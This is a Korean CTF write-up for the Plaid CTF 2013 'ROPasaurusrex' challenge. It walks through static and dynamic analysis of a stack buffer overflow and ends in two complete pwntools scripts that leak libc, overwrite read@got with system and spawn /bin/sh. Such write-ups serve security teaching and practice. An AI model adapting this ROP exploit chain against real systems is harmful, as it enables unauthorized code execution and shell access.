---
title: "[Plaid CTF 2013] ROPasaurusrex"
tags: [ROPasaurusrex, Plaid CTF 2013, writeup]
author: eli_ez3r
key: 20180049
category: write-up
date: 2018-09-10 00:00:00 +0900
modify_date: 2024-04-24
article_header:
  type: cover
  image:
    src:
---

[ROP](#){:.button.button--outline-success.button--pill}

### 0x01. Static Analysis

```shell
root@ubuntu  ~# checksec ropasaurusrex
[*] '/root/Desktop/BoB7/study/ropasaurusrex'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
바이너리 다운 주소 : http://shell-storm.org/repo/CTF/PlaidCTF-2013/Pwnable/ropasaurusrex-200/
보호기법은 NX만 설정되어 있다.

> stack에서 실행 불가능 하다.(쉘코드로 공격 불가능)



```shell
root@ubuntu  ~# file ropasaurusrex
ropasaurusrex: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092, stripped
```

dynamic link로 공유라이브러리를 사용하고 있으며, strip되어 있어 심볼이 없다.



------



### 0x02. Dynamic Analysis

```c
ssize_t __cdecl main()
{
  input();
  return write(1, "WIN\n", 4u);
}
```

main함수에는 input함수를 호출하고 return 하는 과정에서 write 함수를 호출한다. (input은 필자가 수정한 이름)



```c
ssize_t input()
{
  char buf; // [esp+10h] [ebp-88h]

  return read(0, &buf, 0x100u);
}
```

input함수에는 buf를 선언하고 read함수를 통해 stdin에서 0x100(256)byte만큼 읽어들여 buf에 저장한다.  
이때, buf의 크기는 0x88(136)byte인데, 0x100(256)byte 만큼 저장하기 때문에 BoF(Buffer Overflow)가 발생한다.

> ##### **ssize_t read(int fd, void *buf, size_t nbytes)**
> **fd** : 파일 디스크립터  
> **void *buf** :  파일을 읽어 들일 버퍼  
> **size_t nbytes** : 버퍼의 크기  
> **return** : 정상적으로 실행되었다면 읽어들인 바이트 수를 리턴, 실패시 -1을 반환

<br>

```c
ssize_t write(int fd, const void *buf, size_t n)
{
  return write(fd, buf, n);
}
```

> ##### **ssize_t write (int fd, const void *buf, size_t n)**
> **fd** : 파일 디스크립터  
> **void *buf** : 파일에 쓰기를 할 내용을 담은 버퍼  
> **size_t n** : 쓰기할 바이트 개수  
> **return** : 정상적 쓰기를 했다면 쓰기 한 바이트 수, 실패시 -1

<br>

main함수에서 fd값으로 1(stdout), buf값으로 "WIN\n", size값으로 4를 넣어주었으로 화면에 "WIN"이 출력된다..

```shell
root@ubuntu  ~# ./ropasaurusrex
Hello
WIN
```

------

### 0x03. Prepare Exploit

1) BoF취약점을 찾았으므로, read함수를 통해 해당 함수의 ret를 덮을 수 있다.  
2) NT Bit가 설정되어 있으므로 스택에서 쉘코드를 실행 할 수 없다.  
3) 프로그램 내부에서 system함수를 사용하지 않는다.
{:.info}

위 조건으로 살펴보았을 때, ROP기법으로 문제를 풀어 나가면 될것 같다.

우리가 알고 있는 것은 read(), write()함수 이므로 두 함수를 이용하여 Libc주소를 leak하고, 그를 이용하여 system함수의 주소를 구해서 `system('/bin/sh')`를 실행 시키면 될 것 같다.

exploit을 하기 위해 필요한 준비물은
- read@plt 주소
- read@got 주소
- write@plt 주소
- write@got 주소
- pop-pop-pop-ret 가젯 주소
- system함수 offset
- "/bin/sh" 문자열 저장할 주소

<br>

```shell
root@ubuntu  ~# gdb -q ./ropasaurusrex
Reading symbols from ./ropasaurusrex...(no debugging symbols found)...done.
gdb-peda$ disas main
No symbol table is loaded.  Use the "file" command.
```

모든 심볼이 날아갔으므로 `disas main` 명령어가 먹히지 않는다. 따라서, 직접 main의 주소를 찾아야 한다.



```shell
gdb-peda$ info file
Symbols from "/root/Desktop/BoB7/study/ropasaurusrex".
Local exec file:
	`/root/Desktop/BoB7/study/ropasaurusrex', file type elf32-i386.
	Entry point: 0x8048340
	0x08048114 - 0x08048127 is .interp
	0x08048128 - 0x08048148 is .note.ABI-tag
	0x08048148 - 0x0804816c is .note.gnu.build-id
	0x0804816c - 0x08048198 is .hash
	0x08048198 - 0x080481b8 is .gnu.hash
	--- 생략 ---
```

gdb 안에서 `info file` 명령어를 통해 **Entry point(0x8048340)**를 알아낸다.



```shell
gdb-peda$ x/16i 0x8048340
   0x8048340:	xor    ebp,ebp
   0x8048342:	pop    esi
   0x8048343:	mov    ecx,esp
   0x8048345:	and    esp,0xfffffff0
   0x8048348:	push   eax
   0x8048349:	push   esp
   0x804834a:	push   edx
   0x804834b:	push   0x8048450
   0x8048350:	push   0x8048460
   0x8048355:	push   ecx
   0x8048356:	push   esi
   0x8048357:	push   0x804841d
   0x804835c:	call   0x804831c <__libc_start_main@plt>
   0x8048361:	hlt
   0x8048362:	nop
   0x8048363:	nop
```

Entry point에  instruction 을 보면 **_libc_start_main@plt** 를 호출하는 함수가 보인다.  
이때 들어가는 **마지막 push 값("0x804841d")** 이 main함수의 주소가 된다.
> **main 주소 : 0x0804841d**

<br>

```shell
gdb-peda$ x/16i 0x804841d
   0x804841d:	push   ebp
   0x804841e:	mov    ebp,esp
   0x8048420:	and    esp,0xfffffff0
   0x8048423:	sub    esp,0x10
   0x8048426:	call   0x80483f4
   0x804842b:	mov    DWORD PTR [esp+0x8],0x4
   0x8048433:	mov    DWORD PTR [esp+0x4],0x8048510
   0x804843b:	mov    DWORD PTR [esp],0x1
   0x8048442:	call   0x804830c <write@plt>
   0x8048447:	leave
   0x8048448:	ret
```

```c
ssize_t __cdecl main()
{
  input();
  return write(1, "WIN\n", 4u);
}
```

소스코드와 비교하여 봤을 때, main함수에서 첫번째로 call 하는 곳이 input함수,  두번째가 write@plt가 된다.
> **write@plt : 0x804830c**

write@plt를 따라가보면,

```shell
gdb-peda$ x/3i 0x804830c
   0x804830c <write@plt>:	jmp    DWORD PTR ds:0x8049614
   0x8048312 <write@plt+6>:	push   0x8
   0x8048317 <write@plt+11>:	jmp    0x80482ec
```

write@plt에서 jmp하는 주소가 write@got주소가 된다.
> **write@got : 0x8049614**

<br>

```shell
gdb-peda$ x/32i 0x080483f4
   0x80483f4:	push   ebp
   0x80483f5:	mov    ebp,esp
   0x80483f7:	sub    esp,0x98
   0x80483fd:	mov    DWORD PTR [esp+0x8],0x100
   0x8048405:	lea    eax,[ebp-0x88]
   0x804840b:	mov    DWORD PTR [esp+0x4],eax
   0x804840f:	mov    DWORD PTR [esp],0x0
   0x8048416:	call   0x804832c <read@plt>
   0x804841b:	leave
   0x804841c:	ret
```

input 함수 내부이다. read@plt 주소를 확인
> **read@plt : 0x804832c**

read@plt를 따라가보면 read@got 주소를 얻을 수 있다.

```shell
gdb-peda$ x/3i 0x804832c
   0x804832c <read@plt>:	jmp    DWORD PTR ds:0x804961c
   0x8048332 <read@plt+6>:	push   0x18
   0x8048337 <read@plt+11>:	jmp    0x80482ec
```
> **read@got : 0x804961c**

<br>

이제 "/bin/sh" 문자열을 넣을 공간을 찾아야 하는데, 제일 만만한 곳이 bss영역이다.

```shell
root@ubuntu  ~# objdump -h ropasaurusrex | grep bss
 24 .bss          00000008  08049628  08049628  00000628  2**2
```
> **bss주소 : 0x08049628**

<br>

위에서 구한것들을 정리해보면,
- write@plt : 0x804830c  
- write@got : 0x8049614  
- read@plt : 0x804832c  
- read@got : 0x804961c  
- bss주소 : 0x08049628


[*] 위 정보를 다른 방법으로 구하는 방법. 
 <img src="http://eliez3r.synology.me/assets/img/writeup/plaid_ctf_2013/ROPasaurusrex/image-20180826231757695.png" width="600px">{:.rounded.shadow}
{:.info}

<br>

이제 pop-pop-pop-ret 가젯만 구하면 된다.  
ropper를 이용하여 가젯을 구하면 쉽지만, ropper가 없는 환경 일 수 있으니 objdump로 구하는 방법을 소개하겠다.

<img src="http://eliez3r.synology.me/assets/img/writeup/plaid_ctf_2013/ROPasaurusrex/image-20180826231705197.png" width="600px">{:.rounded.shadow}

위에서 나온 가젯들 중 pop-pop-pop-ret이 연속적인 주소로 된 것을 고르면 된다. 

0x080484b6를 사용하면 될 것 같다.

<img src="http://eliez3r.synology.me/assets/img/writeup/plaid_ctf_2013/ROPasaurusrex/image-20180826231440053.png" width="600px">{:.rounded.shadow}  
ropper는 좀 더 이쁘게 보여진다.
{:.info}



------



### 0x04 Exploit

먼저 생각해야 할 점은 Libc의 주소를 leak해야 하며, 이유는 system함수의 주소를 구하기 위함이다.

Libc에 주소를 구하는 방법은 여러가지 방법이 있다.

예를들어서 read함수의 주소를 구하고, 거기서 read함수의 offset을 빼면 Libc의 주소가 나온다.  
그리고 Libc주소에 system함수의 offset을 더하면 system함수의 주소가 된다.

즉 코드로 설명하면,

```python
libc_addr = read_addr - read_offset
system_addr = libc_addr + system_offset
```

<br>

또 다른 방법은 read주소와 system주소의 차이를 구한다.  
그리고 read함수의 주소를 leak하고 그 차이를 더하거나 빼면 system함수가 주소가 된다.

```shell
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e40da0 <system>
gdb-peda$ p read
$2 = {<text variable, no debug info>} 0xf7edbb00 <read>
gdb-peda$ p/x 0xf7edbb00 - 0xf7e40da0
$3 = 0x9ad60
```

```python
system_addr = read_addr - 0x9ad60
```
<br>

어떤 방법을 사용하던 편한 것으로 사용하면된다.  
필자는 2번째 방법을 사용하였다.

```python
from pwn import *

path = "./ropasaurusrex"

# prepare to exploit
read_plt = 0x804832c
read_got = 0x804961c
write_plt = 0x804830c
write_got = 0x8049614
read_system_offset = 0x9ad60
dummy = 0xdeadbeef
pppr = 0x080484b6
binsh = "/bin/sh"
binsh_len = len(binsh)

#p = remote("localhost", 7777)
p = process(path)
e = ELF(path)

# BoF
payload  = "A"*140

# read read_got leak
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

# input "/bin/sh" into bss
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(e.bss())
payload += p32(binsh_len)

# got overwrite : read() -> system()
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(read_got)
payload += p32(4)

# call func ( system("/bin/sh") )
payload += p32(read_plt)
payload += p32(dummy)
payload += p32(e.bss())

p.send(payload)

# recv read_addr (leak)
read_addr = u32(p.recv(4))
print "read_addr : " +hex(read_addr)
# calc system_addr
system_addr = read_addr - read_system_offset
print "system_addr : " + hex(system_addr)

# send "/bin/sh"
p.send(binsh)

# send system_addr
p.send(p32(system_addr))

p.interactive()
```
<img src="http://eliez3r.synology.me/assets/img/writeup/plaid_ctf_2013/ROPasaurusrex/image-20180826232159051.png" width="500px">{:.rounded.shadow}  

<br>

다음은 위 ex코드를 pwntool에 어마무시한 기능들로 다 때려박은 코드이다.

물론 아래 코드가 훨씬 간편하고 쉽겠지만,  
기본 개념들을 익히기 위해서 위코드를 먼저 확실히 이해하고 사용하는것이 좋다.

```python
from pwn import *

# prepare to exploit
binsh = "/bin/sh"
binsh_len = len(binsh)

p = remote("localhost", 7777)
#p = process('./rop')
e = ELF('./rop')
libc = e.libc
rop = ROP(e)


# read read_got leak
rop.write(1, e.got['read'], 4)

# input "/bin/sh" into bss
rop.read(0, e.bss(), binsh_len)

# got overwrite : read() -> system()
rop.read(0, e.got['read'], 4)

# call func ( system("/bin/sh") )
rop.read(e.bss())

p.send("A"*140 + rop.chain())

# recv read_addr (leak)
read_addr = u32(p.recv(4))
print "[*]read_addr : " +hex(read_addr)

# calc system_addr
system_addr = read_addr - libc.symbols['read'] + libc.symbols['system']
print "[*]system_addr : " + hex(system_addr)

# send "/bin/sh"
p.send(binsh)

# send system_addr
p.send(p32(system_addr))

p.interactive()
```
-----
